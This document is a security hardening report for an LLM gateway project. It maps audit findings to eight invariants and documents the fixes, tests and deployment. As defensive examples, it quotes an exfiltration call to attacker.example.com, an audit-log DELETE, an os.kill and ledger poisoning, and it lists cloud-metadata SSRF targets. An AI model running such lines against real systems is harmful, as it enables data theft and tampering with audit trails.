# Session 12 Part 1 — Findings, Invariants, Fixes

**Submission:** [`harden/session12-part1`](https://github.com/Shwethaamrutha/glc_v2/tree/harden/session12-part1) · 12 commits · 310 tests pass · ruff clean · deployed on Modal (workspace `shwetha-sd78`).

**Scope.** Section 6 groups A + C, Section 7's ten leaks. Each finding is mapped below to its Section 4 invariant and the fix that addresses it.

---

## Contents

- [The 8 invariants](#the-8-invariants)
- [Fix summary](#fix-summary)
- [Findings table](#findings-table)
- [Structural vs patched](#structural-vs-patched)
- [Ceilings of an in-repo fix](#ceilings-of-an-in-repo-fix)
- [Per-finding detail](#per-finding-detail)
- [Verification](#verification)
- [Deploying](#deploying)

---

## The 8 invariants

| # | Rule | Prevents |
|---|------|----------|
| 1 | Adapters must never see provider API keys | Key theft by a compromised adapter |
| 2 | Every action checked against the actual user, tenant, and final args | Acting for the wrong principal |
| 3 | External content is always data, never instructions | Prompt injection through content |
| 4 | A credential works for only one tool call | Token reuse across tools/actions |
| 5 | Each tenant has separate memory; every fact records its source | Cross-tenant memory bleed |
| 6 | Dangerous actions approved with their final params | Approve-then-swap (TOCTOU) |
| 7 | Components can't edit or delete their audit logs | Hiding tracks |
| 8 | Hard limits on time, tokens, tool calls, cost | Runaway cost / DoS |

---

## Fix summary

| Move | Where |
|---|---|
| Provider-key isolation — gateway holds no keys; per-provider worker + Secret + egress allowlist | `glc/provider_worker.py`, `glc/provider_broker.py`, `infra/modal_workers.py` |
| Adapter isolation — 15 adapters, each in its own container + Secret + egress | `glc/adapter_worker.py`, `glc/adapter_broker.py`, `infra/modal_adapters.py` |
| Data-plane auth — bearer key, fails closed, docs disabled | `glc/security/auth.py`, `glc/main.py` |
| Egress control — SSRF-safe fetch + per-host allowlist | `glc/security/egress.py` |
| Audit hash chain — SHA-256 chain + verify endpoint | `glc/audit/store.py` |
| Signed cost ledger — HMAC per row + verify endpoint | `glc/db.py` |
| Rate limits + daily budget + pairing throttle | `glc/security/budget.py`, `glc/security/pairing.py` |
| Reproducible deploy — image from `uv.lock`, single audit writer | `infra/modal_app.py` |

---

## Findings table

### Section 6 · Group A

| # | Finding | Inv. | Status |
|---|---------|------|--------|
| A1 | Public data plane, no auth | 2, 8 | Closed |
| A2 | Info disclosure + Swagger open | 2 | Closed |
| A3 | Single Function, no egress wall | 1, 3 | Closed (see leak 6) |
| A4 | One shared Secret for all keys | 1 | Closed (see leak 1) |
| A5 | Non-reproducible image | supply-chain | Closed |
| A6 | Audit DB corrupt under autoscale | 7 | Closed |

### Section 6 · Group C

| # | Finding | Inv. | Status |
|---|---------|------|--------|
| C1 | SSRF via `/v1/vision` | 2 | Closed |
| C2 | Cross-channel envelope spoofing | 2 | Closed (see leak 9) |
| C3 | WS token in query string | 4 | Closed |
| C4 | Verbose upstream errors | info-disclosure | Closed |
| C5 | No rate limits or budget on data plane | 8 | Closed |
| C6 | Pairing-code brute force | 2 | Closed |

### Section 7 — the ten code leaks

| # | Leak | Inv. | Status |
|---|------|------|--------|
| 1 | Shared process env holds all keys | 1 | Closed — structural (per-worker isolation) |
| 2 | Audit DB writable at OS layer | 7 | Detection-only (see ceiling #1, #2) |
| 3 | `force_pair_owner()` in-process | 2 | Closed — guard + structural |
| 4 | Install token readable in-process | 2, 4 | Closed — Secret delivery + structural |
| 5 | Policy engine monkey-patch | 6 | Documented structural (out-of-process is capstone scope) |
| 6 | Unbounded network egress | 1, 3 | Closed — per-worker egress allowlist |
| 7 | Subprocess/shell capability | 8 / RCE | Closed — structural + `restrict_modal_access` |
| 8 | Adapter kills gateway (`os.kill`) | 8 | Documented structural (PID-namespace split) |
| 9 | Cross-channel envelope spoof | 2 | Closed — `env.channel == route` check |
| 10 | Cost-ledger poisoning | 7, 8 | Closed — validation + HMAC signed writer |

---

## Structural vs patched

Leaks 3, 4, 5, 7, 8 exist because adapters share the gateway's process. The lecture's stated fix is process/container separation, not an in-process guard. This repo builds that separation:

- **Provider boundary** (invariant 1): each provider key runs in its own worker with its own Secret and its own egress allowlist. Six workers deployed and live-tested.
- **Adapter boundary**: every one of 15 contributed adapters runs in its own container with its own Secret and its own egress allowlist. `glc.adapter_broker.ADAPTER_REGISTRY` is the single source of truth driving both the subprocess (local) and Modal deploys. All 15 `adapter_<name>` Functions deployed and live-invoked.

Where an in-process guard is also useful (leaks 3, 4, 10), one is shipped on top of the structural fix. Where an in-process guard would be theater (leaks 5, 8), none is added.

---

## Ceilings of an in-repo fix

Five limits are inherent to a self-contained repo hardening. Each is called out inline on the affected finding.

**1. Audit chain vs full-chain rewrite (invariant 7).** The SHA-256 chain detects partial tampering — an edit or delete of a row without recomputing downstream hashes breaks the chain and `verify_chain()` names the row. A full-chain rewrite by an attacker with unrestricted write access to the SQLite file is not detected: they can regenerate every `prev_hash`/`row_hash` from a fresh genesis and the file verifies cleanly. Closing this requires an externally anchored head (WORM checkpoint, trusted third-party log).

**2. Invariant 7 asks for prevention; the fix delivers detection.** An attacker with DB write access can still edit or delete rows; the chain surfaces it after the fact. Prevention needs OS-level append-only or an external log service.

**3. HMAC ledger key colocated with the writer.** `GLC_LEDGER_SIGNING_KEY` lives in the gateway process, which is also the writer. The HMAC protects against out-of-band tampering (co-located adapter touching the Volume, raw SQLite from a non-writer). It does not protect against a compromised gateway. A separate signing process or external ledger service would.

**4. Bearer key ≠ user/tenant identity (invariant 2).** The gateway API key closes A1 (no auth at all). It does not answer invariant 2's "actual user and tenant" — anyone with the shared key is one undifferentiated principal. Per-user identity is the Session 13 work (OAuth Token Exchange, attested workload identity).

**5. Per-worker isolation ≠ single-use credential (invariant 4).** Per-provider workers hold long-lived keys. Invariant 4 asks for one-credential-per-tool-call. Isolation is scope-reduction (which key lives where), not single-use. A scoped-credential broker would be capstone scope.

---

## Per-finding detail

<details><summary><strong>A1 — Public data plane, no auth</strong> · invariant 2, 8</summary>

- **Was:** `/v1/chat`, `/chat/batch`, `/embed`, `/vision`, `/speak`, `/transcribe` ran for anyone; unauth `/v1/chat` returned 502 (provider error), not 401.
- **Fix:** `require_api_key` dependency on every data-plane router. Bearer `GLC_GATEWAY_API_KEY`, constant-time compare, fails closed (503) if no key is configured. `/healthz` stays open. (`glc/security/auth.py`, `glc/main.py`)
- **Verified live:** unauth 401, wrong-key 403, with valid key 502 (reaches provider). Unit tests: `test_data_plane_auth.py`.
- **Ceiling:** see [ceiling #4](#ceilings-of-an-in-repo-fix). Closes A1; does not fully satisfy invariant 2's user/tenant identity requirement.

</details>

<details><summary><strong>A2 — Info disclosure + Swagger open</strong> · invariant 2</summary>

- **Was:** `/v1/status`, `/providers`, `/capabilities`, `/cost/by_agent`, `/calls`, `/docs`, `/openapi.json` all open.
- **Fix:** read surfaces sit behind the same auth gate; `/docs`, `/redoc`, `/openapi.json` disabled unless `GLC_ENABLE_DOCS=1`.
- **Verified live:** `/v1/providers` → 401, `/openapi.json` and `/docs` → 404.

</details>

<details><summary><strong>A3 — Single Function, no egress wall</strong> · invariant 1, 3 (= leak 6)</summary>

Each provider worker Function has its own `GLC_EGRESS_ALLOWLIST`; `glc/security/egress.py` is the app-layer companion that blocks off-allowlist and private/link-local targets. See leak 6.

</details>

<details><summary><strong>A4 — One Secret for all provider keys</strong> · invariant 1 (= leak 1)</summary>

Gateway runs with `GLC_ISOLATED_PROVIDERS=1` and reads no provider key. Each key is a separate per-provider Secret mounted only into that provider's worker. See leak 1 for the mechanism and verification.

</details>

<details><summary><strong>A5 — Non-reproducible image</strong> · supply-chain</summary>

- **Was:** shipped `modal_app.py` on rolling `debian_slim` with `>=` deps, ignored `uv.lock`.
- **Fix:** `infra/modal_app.py` installs from the frozen `uv.lock` (`uv export --frozen`). Provider workers use a minimal pinned image.

</details>

<details><summary><strong>A6 — Audit DB corrupt under autoscale + latent persistence bug</strong> · invariant 7</summary>

- **Was:** `min_containers=0` + autoscale → multiple containers → concurrent SQLite writers → split/corrupt audit trail. Compounding bug: audit, pairing, and ledger stores defaulted to `~/.glc/` and ignored `GLC_CONFIG_DIR`. On Modal these DBs would land on the throwaway container filesystem and vanish on restart.
- **Fix:**
  - `infra/modal_app.py` sets `max_containers=1` (single audit writer).
  - Audit store commits each append (`isolation_level=None`).
  - `glc/audit/store.py`, `glc/db.py`, `glc/security/pairing.py` now honor `GLC_CONFIG_DIR` at call time.

</details>

<details><summary><strong>C1 — SSRF via <code>/v1/vision</code></strong> · invariant 2</summary>

- **Was:** `_resolve_image_urls` fetched any http(s) URL with `follow_redirects=True`, no allowlist.
- **Fix:** `glc/security/egress.safe_get` follows redirects manually and re-validates every hop against the private/loopback/link-local/reserved denylist (IPv4, IPv6, IPv4-mapped IPv6).
- **Verified live:** vision at `169.254.169.254`, `127.0.0.1`, `10.0.0.1`, `fd00::1`, `metadata.google.internal` → 400 rejected. Unit: `test_egress.py`.

</details>

<details><summary><strong>C2 — Cross-channel envelope spoofing</strong></summary>

See leak 9.

</details>

<details><summary><strong>C3 — WS install token in query string</strong> · invariant 4</summary>

- **Was:** `WS /v1/channels/{name}?token=...` accepted the install token in the query string — lands in access logs.
- **Fix:** header-only (`Authorization: Bearer`), constant-time compare. `?token=` path removed.
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_query_string_token`.

</details>

<details><summary><strong>C4 — Verbose upstream errors</strong> · info disclosure</summary>

- **Was:** `/v1/chat` returned the raw provider error and endpoint.
- **Fix:** client sees a generic message; provider/endpoint/raw error stay in the server-side `db.log_call` ledger.
- **Verified live:** mock key request returns `{"detail":"upstream provider error; see gateway logs for detail"}`.

</details>

<details><summary><strong>C5 — No rate limits or budget on public data plane</strong> · invariant 8</summary>

- **Fix:** `glc/security/budget.py` adds per-caller sliding-60s rate limit (`GLC_DATAPLANE_RPM`, default 60) and hard daily request budget (`GLC_DATAPLANE_DAILY_BUDGET`, default 5000), wired as a data-plane dependency.
- **Verified:** `test_dataplane_budget.py`.

</details>

<details><summary><strong>C6 — Pairing-code brute force</strong> · invariant 2</summary>

- **Fix:** `PairingStore.confirm_code` throttles failed attempts (5 per 5-min window, then lockout). Control route returns 429 when throttled.
- **Verified:** `test_pairing_bruteforce.py`.

</details>

---

<details><summary><strong>Leak 1 — Shared process environment holds all keys</strong> · invariant 1</summary>

- **Was:** every adapter runs in the gateway process; `os.environ["GEMINI_API_KEY"]` (and every other key) readable in-process.
- **Fix (structural):** the gateway holds no provider keys. In isolated mode (`GLC_ISOLATED_PROVIDERS=1`) it builds keyless `RemoteProvider` objects that dispatch each call to an isolated worker holding exactly one provider's key — a subprocess locally, a per-provider Modal Function with its own Secret in prod. The key is never in the gateway's memory.
- **Verified live:** gateway process env contains no `GEMINI_API_KEY`; `/v1/chat` dispatches to the worker, which reaches Google with its own key (real completion on a live Gemini key, real error on the mock); a worker with no key fails with "not present". Same path verified with a real NVIDIA key on `chat_nvidia`. Unit: `test_provider_isolation.py`.
- **Ceiling:** see [ceiling #5](#ceilings-of-an-in-repo-fix). Closes invariant 1 structurally; does not satisfy invariant 4's single-use requirement.

</details>

<details><summary><strong>Leak 2 — Audit DB writable at OS layer</strong> · invariant 7</summary>

- **Was:** `sqlite3.connect(...).execute("DELETE FROM audit_log")` silently erases history.
- **Fix:** SHA-256 hash chain on `audit_log` (`prev_hash`, `row_hash`; schema v2). Partial tampering — DELETE/UPDATE/splice without recomputing downstream hashes — breaks the chain and `verify_chain()` reports the first broken row. Exposed at `GET /v1/control/audit/verify` (install-token gated). Single-writer gateway (A6) keeps read-then-write atomic.
- **Verified:** `test_audit_chain.py` — delete and edit both detected.
- **Ceilings:** see [#1](#ceilings-of-an-in-repo-fix) (full-chain rewrite) and [#2](#ceilings-of-an-in-repo-fix) (detection vs prevention).

</details>

<details><summary><strong>Leak 3 — <code>force_pair_owner()</code> reachable in-process</strong> · invariant 2</summary>

- **Was:** one line grants the caller `owner_paired` trust.
- **Fix (guard + structural):** `force_pair_owner()` refuses to run unless `GLC_ALLOW_FORCE_PAIR=1`. The one-shot installer sets it; the serving gateway never does. Structural close is the container split.
- **Verified:** `test_force_pair_guard.py`.

</details>

<details><summary><strong>Leak 4 — Install token readable in-process</strong> · invariant 2, 4</summary>

- **Was:** `~/.glc/install_token` at mode 0600 keeps out other Unix users but not same-user code.
- **Fix (hardening + structural):** token delivered via `GLC_INSTALL_TOKEN` (a Secret mounted only into the gateway); in that mode, never written to the shared config Volume.
- **Verified:** `test_install_token_secret.py`.

</details>

<details><summary><strong>Leak 5 — Policy engine open to monkey-patching</strong> · invariant 6 · documented structural</summary>

`glc.policy.engine.evaluate = lambda ...` rebinds the policy check. The lecture's stated fix is running the policy engine in a separate process (capstone scope). In-process Python can always rebind a module attribute, so an in-process guard would be theater. The policy engine has no live runtime call site yet (S11 agent is a stub); no in-process guard is added.

</details>

<details><summary><strong>Leak 6 — Unbounded network egress</strong> · invariant 1, 3</summary>

- **Was:** `httpx.post("https://attacker.example.com/exfil", ...)` and the bytes leave; a single Function has no outbound control.
- **Fix:** per-provider workers run with their own egress allowlist (`GLC_EGRESS_ALLOWLIST` = that provider's host only). `glc/security/egress.assert_egress_allowed` blocks off-allowlist and private/link-local hosts.
- **Note:** egress control is one necessary layer; data can still leave through an allowed reply (per the lecture's "surviving chain" in Section 12).
- **Verified:** `test_egress.py`.

</details>

<details><summary><strong>Leak 7 — Unrestricted subprocess/shell capability</strong> · invariant 8 / RCE</summary>

There is no shell-injection bug in the code — every `subprocess.run` (whisper_cpp wrapper, system-fallback TTS) passes an argument list, never `shell=True` or `os.system`. The leak is a capability: any adapter can shell out and the monolithic image ships a shell.

**Fix (structural + hardening flag):** per-component minimal images + gVisor sandbox (Modal `serialized=True` Functions run under gVisor — non-root, isolated PID/mount namespaces, syscall shield) + per-Function egress allowlists + `restrict_modal_access=True` on every provider worker and adapter Function. The last flag strips the container's ambient Modal API credential, so a compromised worker can't use the platform token to reach other functions or Secrets.

**Note:** Modal 1.5 has no read-only-root-FS flag, so the prescribed "read-only filesystem" item is substituted by `restrict_modal_access` as the available blast-radius reduction.

</details>

<details><summary><strong>Leak 8 — Adapter kills the gateway (<code>os.kill</code>)</strong> · invariant 8 · documented structural</summary>

`os.kill(os.getpid(), SIGTERM)` ends the process. The remote kill endpoint is loopback-gated, so the internet path is closed. The in-process path is only closed by putting adapters in a separate PID namespace so they cannot see the gateway's PID. Container split addresses this; no in-process guard can stop code in the same process from signalling it.

</details>

<details><summary><strong>Leak 9 — Cross-channel envelope spoofing</strong> · invariant 2</summary>

- **Was:** WS `/v1/channels/{name}` never checked `env.channel == name`. A Telegram adapter could send `env.channel="discord"` and impersonate Discord.
- **Fix:** the WS route rejects any envelope whose `env.channel` differs from the route name, records a `channel_spoof_rejected` audit event, and closes the socket.
- **Verified:** `test_channel_ws_security.py::test_ws_rejects_channel_mismatch`.

</details>

<details><summary><strong>Leak 10 — Cost-ledger poisoning</strong> · invariant 7, 8</summary>

- **Was:** `db.log_call(... input_tokens=999_999_999 ...)` validated nothing.
- **Fix:** two independent layers.
  1. **Input validation** — `log_call` rejects non-int, negative, and absurd (>10M) token counts (`LedgerValidationError`) at the app-layer entry point.
  2. **Signed writer (HMAC-SHA256)** — each row carries an HMAC over its signed fields, keyed by `GLC_LEDGER_SIGNING_KEY`. A row forged or edited via raw SQLite fails signature verification. Verifiable at `GET /v1/control/ledger/verify` (install-token gated). `sig` column added with a defensive `ALTER TABLE` migration.
- **Verified:** `test_cost_ledger.py` — validation rejects the documented poison; signature detects a raw-SQL `UPDATE` of an existing row and a fully forged `INSERT`.
- **Ceiling:** see [ceiling #3](#ceilings-of-an-in-repo-fix). HMAC protects against out-of-band DB writes; not against a compromised gateway process.

</details>

---

## Verification

### Automated tests

310 tests pass, ruff clean. Per-finding test files:

- `test_data_plane_auth.py` — A1, A2
- `test_egress.py` — C1, leak 6
- `test_channel_ws_security.py` — C3, leak 9
- `test_dataplane_budget.py` — C5
- `test_pairing_bruteforce.py` — C6
- `test_audit_chain.py` — leak 2
- `test_provider_isolation.py` — leak 1
- `test_force_pair_guard.py` — leak 3
- `test_install_token_secret.py` — leak 4
- `test_cost_ledger.py` — leak 10
- `test_adapter_isolation.py` — adapter boundary

### Live verification on Modal (workspace `shwetha-sd78`)

**Provider workers (6 deployed).** Real-key end-to-end flow verified on Gemini and NVIDIA workers. Full path: `/v1/chat` on the gateway → auth clears → dispatch → isolated worker → real API call → completion. Gateway process env contains no provider key during any of this. The mechanism is identical across all six workers (`_make_worker` factory in `infra/modal_workers.py`); the other four (Groq, Cerebras, OpenRouter, GitHub) are deployed with the same wiring but not exercised with real keys.

**Adapter workers (15 deployed, all live-invoked).** Each `adapter_<name>` Function was invoked directly with a `send` request carrying a valid `ChannelReply`. Every Function ran its adapter code inside its own container. Outcomes:

| Adapter | Live outcome |
|---|---|
| gmail | Reached `_get_client()` / `token.json` (mock creds, no OAuth token) |
| telegram | Reached `api.telegram.org` with its own mock token → 404 |
| discord | Ran transport check |
| slack | Executed send; returned mock channel/text |
| whatsapp | Ran pairing check |
| twilio_sms | Reached Twilio API; auth error on mock creds |
| twilio_voice | Produced TwiML response |
| line | Ran transport check |
| teams | Ran context-cache check |
| matrix | Produced matrix send payload |
| signal | Produced signal-cli JSON-RPC payload |
| imap | Reached SMTP layer |
| webhook | Reached HTTP destination |
| webui | Produced ack payload |
| local_mic | Reached TTS router |

The purpose of these invocations is to prove the isolation mechanism (adapter code executes inside its own container with only its own Secret) rather than the platform wire (which requires real accounts per channel). Every adapter's code executed inside its dedicated container.

### Not exercised

- Real-key traffic through the four remaining provider workers (mechanism identical; not tested end-to-end).
- Real accounts on the twelve non-spot-tested channels (Twilio, Discord/Slack/Teams/etc.) — each requires its own registered platform account.
- Full attack matrix (every egress-allowlist entry × every worker × every attack vector).
- Kernel-level Modal Sandbox escape or long-running soak tests.

---

## Deploying

```bash
# per-provider key Secrets (mock values)
modal secret create glc-key-gemini      GEMINI_API_KEY=mock-not-real
modal secret create glc-key-groq        GROQ_API_KEY=mock-not-real
modal secret create glc-key-nvidia      NVIDIA_API_KEY=mock-not-real
modal secret create glc-key-cerebras    CEREBRAS_API_KEY=mock-not-real
modal secret create glc-key-openrouter  OPEN_ROUTER_API_KEY=mock-not-real
modal secret create glc-key-github      GITHUB_ACCESS_TOKEN=mock-not-real

# gateway auth key (no provider keys on the gateway)
modal secret create glc-gateway-auth    GLC_GATEWAY_API_KEY=<long-random>

# per-adapter channel secrets (all 15, mock values)
uv run python scripts/create_adapter_secrets.py --run

# deploy
modal deploy infra/modal_workers.py    # per-provider isolated workers
modal deploy infra/modal_adapters.py   # per-adapter isolated Sandboxes (all 15)
modal deploy infra/modal_app.py        # keyless gateway
```

Run the gateway with isolated adapters:

```bash
GLC_ISOLATED_ADAPTERS=1 GLC_ADAPTER_BACKEND=modal
```

Or locally with subprocess adapters and a per-adapter secret dir:

```bash
GLC_ADAPTER_SECRETS_DIR=/path/to/adapter-secrets \
GLC_ISOLATED_ADAPTERS=1 \
GLC_ADAPTER_BACKEND=subprocess
```

Provider workers (local subprocess mode):

```bash
GLC_ISOLATED_PROVIDERS=1 \
GLC_PROVIDER_BACKEND=subprocess \
GLC_PROVIDER_KEYS_DIR=/path/to/keys \
GLC_REQUIRE_AUTH=1 \
GLC_GATEWAY_API_KEY=... \
uv run uvicorn glc.main:app
```
